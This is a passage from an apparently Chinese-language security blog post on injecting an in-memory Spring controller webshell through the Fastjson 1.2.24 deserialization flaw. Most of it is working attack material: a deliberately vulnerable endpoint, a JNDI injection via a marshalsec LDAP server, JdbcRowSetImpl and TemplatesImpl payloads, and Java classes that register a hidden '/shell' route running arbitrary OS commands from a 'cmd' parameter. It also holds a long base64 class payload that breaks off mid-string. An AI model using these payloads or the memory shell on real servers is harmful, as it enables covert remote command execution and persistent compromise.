class=\"line\">&lt;dependency&gt;</span><br><span class=\"line\">    &lt;groupId&gt;com.alibaba&lt;&#x2F;groupId&gt;</span><br><span class=\"line\">    &lt;artifactId&gt;fastjson&lt;&#x2F;artifactId&gt;</span><br><span class=\"line\">    &lt;version&gt;1.2.24&lt;&#x2F;version&gt;</span><br><span class=\"line\">&lt;&#x2F;dependency&gt;</span><br></pre></td></tr></table></figure>\n\n<p>JsonController</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">package</span> com.example.controller;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> com.alibaba.fastjson.JSON;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.springframework.stereotype.Controller;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.springframework.web.bind.annotation.RequestBody;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.springframework.web.bind.annotation.RequestMapping;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.springframework.web.bind.annotation.RequestMethod;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.springframework.web.bind.annotation.ResponseBody;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">@Controller</span></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">JsonController</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"meta\">@ResponseBody</span></span><br><span class=\"line\">    <span class=\"meta\">@RequestMapping(value = &quot;/fastjson&quot;, method = RequestMethod.POST)</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> String <span class=\"title\">test01</span><span class=\"params\">(<span class=\"meta\">@RequestBody</span> String payload)</span></span>&#123;</span><br><span class=\"line\">        Object object = JSON.parse(payload);</span><br><span class=\"line\">        <span class=\"keyword\">return</span> object.toString();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"出网情况\"><a href=\"#出网情况\" class=\"headerlink\" title=\"出网情况\"></a>出网情况</h3><p>利用 ldap或 rmi</p>\n<p>JndiController.java</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> org.springframework.web.context.WebApplicationContext;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.springframework.web.context.request.RequestContextHolder;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.springframework.web.context.request.ServletRequestAttributes;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.springframework.web.servlet.mvc.condition.PatternsRequestCondition;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.springframework.web.servlet.mvc.condition.RequestMethodsRequestCondition;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.springframework.web.servlet.mvc.method.RequestMappingInfo;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;</span><br><span class=\"line\"><span class=\"keyword\">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.io.*;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.lang.reflect.Method;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">JndiController</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"title\">JndiController</span><span class=\"params\">()</span> <span class=\"keyword\">throws</span> NoSuchMethodException </span>&#123;</span><br><span class=\"line\">        <span class=\"comment\">// 1. 利用spring内部方法获取context</span></span><br><span class=\"line\">        WebApplicationContext context = (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute(<span class=\"string\">&quot;org.springframework.web.servlet.DispatcherServlet.CONTEXT&quot;</span>,<span class=\"number\">0</span>);</span><br><span class=\"line\">        <span class=\"comment\">// 2. 从context中获取 RequestMappingHandlerMapping实例</span></span><br><span class=\"line\">        RequestMappingHandlerMapping mappingHandlerMapping = context.getBean(RequestMappingHandlerMapping.class);</span><br><span class=\"line\">        <span class=\"comment\">// 3. 反射获取InjectController的method</span></span><br><span class=\"line\">        Method method = JndiController.class.getMethod(<span class=\"string\">&quot;test&quot;</span>);</span><br><span class=\"line\">        <span class=\"comment\">// 4. 定义访问 controller 的 URL 地址</span></span><br><span class=\"line\">        PatternsRequestCondition url = <span class=\"keyword\">new</span> PatternsRequestCondition(<span class=\"string\">&quot;/shell&quot;</span>);</span><br><span class=\"line\">        <span class=\"comment\">// 5. 定义允许访问 controller 的 HTTP 方法（GET/POST）</span></span><br><span class=\"line\">        RequestMethodsRequestCondition ms = <span class=\"keyword\">new</span> RequestMethodsRequestCondition();</span><br><span class=\"line\">        <span class=\"comment\">// 6. 在内存中动态注册 controller</span></span><br><span class=\"line\">        RequestMappingInfo info = <span class=\"keyword\">new</span> RequestMappingInfo(url, ms, <span class=\"keyword\">null</span>, <span class=\"keyword\">null</span>, <span class=\"keyword\">null</span>, <span class=\"keyword\">null</span>, <span class=\"keyword\">null</span>);</span><br><span class=\"line\">        JndiController injectToController = <span class=\"keyword\">new</span> JndiController(<span class=\"string\">&quot;xxx&quot;</span>);</span><br><span class=\"line\">        mappingHandlerMapping.registerMapping(info,injectToController,method);</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"title\">JndiController</span><span class=\"params\">(String tmp)</span></span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> String <span class=\"title\">test</span><span class=\"params\">()</span> <span class=\"keyword\">throws</span> Exception </span>&#123;</span><br><span class=\"line\">        <span class=\"comment\">// 获取request</span></span><br><span class=\"line\">        HttpServletRequest request = ((ServletRequestAttributes) (RequestContextHolder.currentRequestAttributes())).getRequest();</span><br><span class=\"line\"></span><br><span class=\"line\">        InputStream is = Runtime.getRuntime().exec(request.getParameter(<span class=\"string\">&quot;cmd&quot;</span>)).getInputStream();</span><br><span class=\"line\">        InputStreamReader isr = <span class=\"keyword\">new</span> InputStreamReader(is, <span class=\"string\">&quot;GBK&quot;</span>);</span><br><span class=\"line\">        BufferedReader br = <span class=\"keyword\">new</span> BufferedReader(isr);</span><br><span class=\"line\">        String str = <span class=\"string\">&quot;&quot;</span>;</span><br><span class=\"line\">        String line = <span class=\"string\">&quot;&quot;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">while</span> ((line = br.readLine())!=<span class=\"keyword\">null</span>)&#123;</span><br><span class=\"line\">            str+=line;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        is.close();</span><br><span class=\"line\">        br.close();</span><br><span class=\"line\">        <span class=\"keyword\">return</span> str;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>编译为class文件后，利用marashalsec起一个ldap，将恶意class文件所在目录利用python起一个http-server</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http:&#x2F;&#x2F;127.0.0.1:8000&#x2F;#JndiController</span><br></pre></td></tr></table></figure>\n\n<p>fastjson触发jndi注入</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">&#123;&quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,&quot;dataSourceName&quot;:&quot;ldap:&#x2F;&#x2F;127.0.0.1:1389&#x2F;test&quot;,&quot;autoCommit&quot;:true&#125;</span><br></pre></td></tr></table></figure>\n\n<p>获取恶意class成功</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E5%86%85%E5%AD%98%E9%A9%AC/image-20220608195422042.png\" alt=\"image-20220608195422042\"></p>\n<p>成功注入</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E5%86%85%E5%AD%98%E9%A9%AC/image-20220608195602979.png\" alt=\"image-20220608195602979\"></p>\n<h3 id=\"不出网\"><a href=\"#不出网\" class=\"headerlink\" title=\"不出网\"></a>不出网</h3><p>fastjson反序列化利用 TemplatesImpl 链</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class=\"line\"><span class=\"keyword\">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class=\"line\"><span class=\"keyword\">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class=\"line\"><span class=\"keyword\">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class=\"line\"><span class=\"keyword\">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.springframework.web.context.WebApplicationContext;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.springframework.web.context.request.RequestContextHolder;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.springframework.web.context.request.ServletRequestAttributes;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.springframework.web.servlet.mvc.condition.PatternsRequestCondition;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.springframework.web.servlet.mvc.condition.RequestMethodsRequestCondition;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.springframework.web.servlet.mvc.method.RequestMappingInfo;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class=\"line\"><span class=\"keyword\">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.io.*;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.lang.reflect.Method;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.util.Scanner;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">poc_1</span> <span class=\"keyword\">extends</span> <span class=\"title\">AbstractTranslet</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"title\">poc_1</span><span class=\"params\">()</span> <span class=\"keyword\">throws</span> IOException, NoSuchMethodException </span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">        WebApplicationContext context = (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute(<span class=\"string\">&quot;org.springframework.web.servlet.DispatcherServlet.CONTEXT&quot;</span>,<span class=\"number\">0</span>);</span><br><span class=\"line\">        RequestMappingHandlerMapping mappingHandlerMapping = context.getBean(RequestMappingHandlerMapping.class);</span><br><span class=\"line\">        Method method = poc_1.class.getMethod(<span class=\"string\">&quot;test&quot;</span>);</span><br><span class=\"line\">        PatternsRequestCondition url = <span class=\"keyword\">new</span> PatternsRequestCondition(<span class=\"string\">&quot;/shell&quot;</span>);</span><br><span class=\"line\">        RequestMethodsRequestCondition ms = <span class=\"keyword\">new</span> RequestMethodsRequestCondition();</span><br><span class=\"line\">        RequestMappingInfo info = <span class=\"keyword\">new</span> RequestMappingInfo(url, ms, <span class=\"keyword\">null</span>, <span class=\"keyword\">null</span>, <span class=\"keyword\">null</span>, <span class=\"keyword\">null</span>, <span class=\"keyword\">null</span>);</span><br><span class=\"line\">        poc_1 injectToController = <span class=\"keyword\">new</span> poc_1(<span class=\"string\">&quot;xxx&quot;</span>);</span><br><span class=\"line\">        mappingHandlerMapping.registerMapping(info,injectToController,method);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"title\">poc_1</span><span class=\"params\">(String tmp)</span></span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">test</span><span class=\"params\">()</span> <span class=\"keyword\">throws</span> Exception </span>&#123;</span><br><span class=\"line\">        HttpServletRequest request = ((ServletRequestAttributes) (RequestContextHolder.currentRequestAttributes())).getRequest();</span><br><span class=\"line\">        HttpServletResponse response = ((ServletRequestAttributes) (RequestContextHolder.currentRequestAttributes())).getResponse();</span><br><span class=\"line\">        PrintWriter writer = response.getWriter();</span><br><span class=\"line\">        String cmd = request.getParameter(<span class=\"string\">&quot;cmd&quot;</span>);</span><br><span class=\"line\">        <span class=\"keyword\">try</span>&#123;</span><br><span class=\"line\">            String o = <span class=\"string\">&quot;&quot;</span>;</span><br><span class=\"line\">            ProcessBuilder p;</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (System.getProperty(<span class=\"string\">&quot;os.name&quot;</span>).toLowerCase().contains(<span class=\"string\">&quot;win&quot;</span>)) &#123;</span><br><span class=\"line\">                p = <span class=\"keyword\">new</span> ProcessBuilder(<span class=\"keyword\">new</span> String[]&#123;<span class=\"string\">&quot;cmd.exe&quot;</span>, <span class=\"string\">&quot;/c&quot;</span>, cmd&#125;);</span><br><span class=\"line\">            &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">                p = <span class=\"keyword\">new</span> ProcessBuilder(<span class=\"keyword\">new</span> String[]&#123;<span class=\"string\">&quot;/bin/sh&quot;</span>, <span class=\"string\">&quot;-c&quot;</span>, cmd&#125;);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            Scanner c = (<span class=\"keyword\">new</span> Scanner(p.start().getInputStream())).useDelimiter(<span class=\"string\">&quot;\\\\\\\\A&quot;</span>);</span><br><span class=\"line\">            o = c.hasNext() ? c.next() : o;</span><br><span class=\"line\">            c.close();</span><br><span class=\"line\">            writer.write(o);</span><br><span class=\"line\">            writer.flush();</span><br><span class=\"line\">            writer.close();</span><br><span class=\"line\">        &#125; <span class=\"keyword\">catch</span> (Exception e) &#123;</span><br><span class=\"line\">            response.sendError(<span class=\"number\">404</span>);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">transform</span><span class=\"params\">(DOM document, SerializationHandler[] handlers)</span> <span class=\"keyword\">throws</span> TransletException </span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">transform</span><span class=\"params\">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class=\"keyword\">throws</span> TransletException </span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">main</span><span class=\"params\">(String[] args)</span> <span class=\"keyword\">throws</span> Exception </span>&#123;</span><br><span class=\"line\">        poc_1 t = <span class=\"keyword\">new</span> poc_1();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>编译为class文件后，base64编码放到 <strong>_bytecodes</strong> 中</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">&#123;&quot;@type&quot;:&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;,&quot;_bytecodes&quot;:[&quot;yv66vgAAADQA7QoAOQCACgCBAIIIAIMLAIQAhQcAhgcAhwsABQCIBwCJCABVBwCKCgAKAIsHAIwHAI0IAI4KAAwAjwcAkAcAkQoAEACSBwCTCgATAJQIAJUKAAgAlgoABgCXBwCYCgAYAJkKABgAmgsAmwCcCABjCwCdAJ4IAJ8IAKAKAKEAogoADQCjCACkCgANAKUHAKYIAKcIAKgKACQAjwgAqQgAqgcAqwoAJACsCgCtAK4KACoArwgAsAoAKgCxCgAqALIKACoAswoAKgC0CgC1ALYKALUAtwoAtQC0BwC4CwCbALkKAAgAgAcAugEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQAHTHBvY18xOwEAB2NvbnRleHQBADdMb3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvY29udGV4dC9XZWJBcHBsaWNhdGlvbkNvbnRleHQ7AQAVbWFwcGluZ0hhbmRsZXJNYXBwaW5nAQBUTG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL3NlcnZsZXQvbXZjL21ldGhvZC9hbm5vdGF0aW9uL1JlcXVlc3RNYXBwaW5nSGFuZGxlck1hcHBpbmc7AQAGbWV0aG9kAQAaTGphdmEvbGFuZy9yZWZsZWN0L01ldGhvZDsBAAN1cmwBAEhMb3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvc2VydmxldC9tdmMvY29uZGl0aW9uL1BhdHRlcm5zUmVxdWVzdENvbmRpdGlvbjsBAAJtcwEATkxvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9zZXJ2bGV0L212Yy9jb25kaXRpb24vUmVxdWVzdE1ldGhvZHNSZXF1ZXN0Q29uZGl0aW9uOwEABGluZm8BAD9Mb3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvc2VydmxldC9tdmMvbWV0aG9kL1JlcXVlc3RNYXBwaW5nSW5mbzsBABJpbmplY3RUb0NvbnRyb2xsZXIBAApFeGNlcHRpb25zBwC7BwC8AQAVKExqYXZhL2xhbmcvU3RyaW5nOylWAQADdG1wAQASTGphdmEvbGFuZy9TdHJpbmc7AQAQTWV0aG9kUGFyYW1ldGVycwEABHRlc3QBAAFwAQAaTGphdmEvbGFuZy9Qcm9jZXNzQnVpbGRlcjsBAAFvAQABYwEAE0xqYXZhL3V0aWwvU2Nhbm5lcjsBAAFlAQAVTGphdmEvbGFuZy9FeGNlcHRpb247AQAHcmVxdWVzdAEAJ0xqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXF1ZXN0OwEACHJlc3BvbnNlAQAoTGphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlc3BvbnNlOwEABndyaXRlcgEAFUxqYXZhL2lvL1ByaW50V3JpdGVyOwEAA2NtZAEADVN0YWNrTWFwVGFibGUHAIkHAL0HAL4HAL8HAI0HAKYHAKsHALgBAAl0cmFuc2Zvcm0BAHIoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007W0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAhkb2N1bWVudAEALUxjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NOwEACGhhbmRsZXJzAQBCW0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7BwDAAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGl0ZXJhdG9yAQA1TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjsBAAdoYW5kbGVyAQBBTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsBAARtYWluAQAWKFtMamF2YS9sYW5nL1N0cmluZzspVgEABGFyZ3MBABNbTGphdmEvbGFuZy9TdHJpbmc7AQABdAEAClNvdXJjZUZpbGUBAApwb2NfMS5qYXZhDAA6ADsHAMEMAMIAwwEAOW9yZy5zcHJpbmdmcmFtZXdvcmsud2ViLnNlcnZsZXQuRGlzcGF0Y2hlclNlcnZsZXQuQ09OVEVYVAcAxAwAxQDGAQA1b3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvY29udGV4dC9XZWJBcHBsaWNhdGlvbkNvbnRleHQBAFJvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9zZXJ2bGV0L212Yy9tZXRob2QvYW5ub3RhdGlvbi9SZXF1ZXN0TWFwcGluZ0hhbmRsZXJNYXBwaW5nDADHAMgBAAVwb2NfMQEAD2phdmEvbGFuZy9DbGFzcwwAyQDKAQBGb3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvc2VydmxldC9tdmMvY29uZGl0aW9uL1BhdHRlcm5zUmVxdWVzdENvbmRpdGlvbgEAEGphdmEvbGFuZy9TdHJpbmcBAAYvc2hlbGwMADoAegEATG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL3NlcnZsZXQvbXZjL2NvbmRpdGlvbi9SZXF1ZXN0TWV0aG9kc1JlcXVlc3RDb25kaXRpb24BADVvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9iaW5kL2Fubm90YXRpb24vUmVxdWVzdE1ldGhvZAwAOgDLAQA9b3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvc2VydmxldC9tdmMvbWV0aG9kL1JlcXVlc3RNYXBwaW5nSW5mbwwAOgDMAQADeHh4DAA6AFEMAM0AzgEAQG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL2NvbnRleHQvcmVxdWVzdC9TZXJ2bGV0UmVxdWVzdEF0dHJpYnV0ZXMMAM8A0AwA0QDSBwC+DADTANQHAL0MANUA1gEAAAEAB29zLm5hbWUHANcMANgA1gwA2QDaAQADd2luDADbANwBABhqYXZhL2xhbmcvUHJvY2Vzc0J1aWxkZXIBAAdjbWQuZXhlAQACL2MBAAcvYmluL3NoAQACLWMBABFqYXZhL3V0aWwvU2Nhbm5lcgwA3QDeBwDfDADgAOEMADoA4gEAA1xcQQwA4wDkDADlAOYMAOcA2gwA6AA7BwC&#x2F;DADpAFEMAOoAOwEAE2phdmEvbGFuZy9FeGNlcHRpb24MAOsA7AEAQGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ydW50aW1lL0Fic3RyYWN0VHJhbnNsZXQBABNqYXZhL2lvL0lPRXhjZXB0aW9uAQAfamF2YS9sYW5nL05vU3VjaE1ldGhvZEV4Y2VwdGlvbgEAJWphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlcXVlc3QBACZqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXNwb25zZQEAE2phdmEvaW8vUHJpbnRXcml0ZXIBADljb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvVHJhbnNsZXRFeGNlcHRpb24BADxvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9jb250ZXh0L3JlcXVlc3QvUmVxdWVzdENvbnRleHRIb2xkZXIBABhjdXJyZW50UmVxdWVzdEF0dHJpYnV0ZXMBAD0oKUxvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9jb250ZXh0L3JlcXVlc3QvUmVxdWVzdEF0dHJpYnV0ZXM7AQA5b3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvY29udGV4dC9yZXF1ZXN0L1JlcXVlc3RBdHRyaWJ1dGVzAQAMZ2V0QXR0cmlidXRlAQAnKExqYXZhL2xhbmcvU3RyaW5nO0kpTGphdmEvbGFuZy9PYmplY3Q7AQAHZ2V0QmVhbgEAJShMamF2YS9sYW5nL0NsYXNzOylMamF2YS9sYW5nL09iamVjdDsBAAlnZXRNZXRob2QBAEAoTGphdmEvbGFuZy9TdHJpbmc7W0xqYXZhL2xhbmcvQ2xhc3M7KUxqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2Q7AQA7KFtMb3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvYmluZC9hbm5vdGF0aW9uL1JlcXVlc3RNZXRob2Q7KVYBAfYoTG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL3NlcnZsZXQvbXZjL2NvbmRpdGlvbi9QYXR0ZXJuc1JlcXVlc3RDb25kaXRpb247TG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL3NlcnZsZXQvbXZjL2NvbmRpdGlvbi9SZXF1ZXN0TWV0aG9kc1JlcXVlc3RDb25kaXRpb247TG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL3NlcnZsZXQvbXZjL2NvbmRpdGlvbi9QYXJhbXNSZXF1ZXN0Q29uZGl0aW9uO0xvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9zZXJ2bGV0L212Yy9jb25kaXRpb24vSGVhZGVyc1JlcXVlc3RDb25kaXRpb247TG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL3NlcnZsZXQvbXZjL2NvbmRpdGlvbi9Db25zdW1lc1JlcXVlc3RDb25kaXRpb247TG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL3NlcnZsZXQvbXZjL2NvbmRpdGlvbi9Qcm9kdWNlc1JlcXVlc3RDb25kaXRpb247TG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL3NlcnZsZXQvbXZjL2NvbmRpdGlvbi9SZXF1ZXN0Q29uZGl0aW9uOylWAQAPcmVnaXN0ZXJNYXBwaW5nAQBuKExvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9zZXJ2bGV0L212Yy9tZXRob2QvUmVxdWVzdE1hcHBpbmdJbmZvO0xqYXZhL2xhbmcvT2JqZWN0O0xqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2Q7KVYBAApnZXRSZXF1ZXN0AQApKClMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVxdWVzdDsBAAtnZXRSZXNwb25zZQEAKigpTGphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlc3BvbnNlOwEACWdldFdyaXRlcgEAFygpTGphdmEvaW8vUHJpbnRXcml0ZXI7AQAMZ2V0UGFyYW1ldGVyAQAmKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1N0cmluZzsBABBqYXZhL2xhbmcvU3lzdGVtAQALZ2V0UHJvcGVydHkBAAt0b0xvd2VyQ2FzZQEAFCgpTGphdmEvbGFuZy9TdHJpbmc7AQAIY29udGFpbnMBABsoTGphdmEvbGFuZy9DaGFyU2VxdWVuY2U7KVoBAAVzdGFydAEAFSgpTGphdmEvbGFuZy9Qcm9jZXNzOwEAEWphdmEvbGFuZy9Qcm9jZXNzAQAOZ2V0SW5wdXRTdHJlYW0BABcoKUxqYXZhL2lvL0lucHV0U3RyZWFtOwEAGChMamF2YS9pby9JbnB1dFN0cmVhbTspVgEADHVzZURlbGltaXRlcgEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvdXRpbC9TY2FubmVyOwEAB2hhc05leHQBAAMoKVoBAARuZXh0AQAFY2xvc2UBAAV3cml0ZQEABWZsdXNoAQAJc2VuZEVycm9yAQAEKEkpVgAhAAgAOQAAAAAABgABADoAOwACADwAAAEFAAkACAAAAHEqtwABuAACEgMDuQAEAwDAAAVMKxIGuQAHAgDAAAZNEggSCQO9AAq2AAtOuwAMWQS9AA1ZAxIOU7cADzoEuwAQWQO9ABG3ABI6BbsAE1kZBBkFAQEBAQG3ABQ6BrsACFkSFbcAFjoHLBkGGQcttgAXsQAAAAIAPQAAACoACgAAABYABAAYABMAGQAfABoAKwAbAD0AHABKAB0AXAAeAGcAHwBwACAAPgAAAFIACAAAAHEAPwBAAAAAEwBeAEEAQgABAB8AUgBDAEQAAgArAEYARQBGAAMAPQA0AEcASAAEAEoAJwBJAEoABQBcABUASwBMAAYAZwAKAE0AQAAHAE4AAAAGAAIATwBQAAEAOgBRAAIAPAAAAD0AAQACAAAABSq3AAGxAAAAAgA9AAAACgACAAAAIgAEACQAPgAAABYAAgAAAAUAPwBAAAAAAAAFAFIAUwABAFQAAAAFAQBSAAAAAQBVADsAAgA8AAAB4QAGAAgAAADGuAACwAAYwAAYtgAZTLgAAsAAGMAAGLYAGk0suQAbAQBOKxIcuQAdAgA6BBIeOgUSH7gAILYAIRIitgAjmQAiuwAkWQa9AA1ZAxIlU1kEEiZTWQUZBFO3ACc6BqcAH7sAJFkGvQANWQMSKFNZBBIpU1kFGQRTtwAnOga7ACpZGQa2ACu2ACy3AC0SLrYALzoHGQe2ADCZAAsZB7YAMacABRkFOgUZB7YAMi0ZBbYAMy22ADQttgA1pwAOOgUsEQGUuQA3AgCxAAEAKwC3ALoANgADAD0AAABKABIAAAAnAA0AKAAaACkAIQAqACsALAAvAC4APwAvAF4AMQB6ADMAkAA0AKQANQCpADYArwA3ALMAOAC3ADsAugA5ALwAOgDFADwAPgAAAGYACgBbAAMAVgBXAAYALwCIAFgAUwAFAHoAPQBWAFcABgCQACcAWQBaAAcAvAAJAFsAXAAFAAAAxgA&#x2F;AEAAAAANALkAXQBeAAE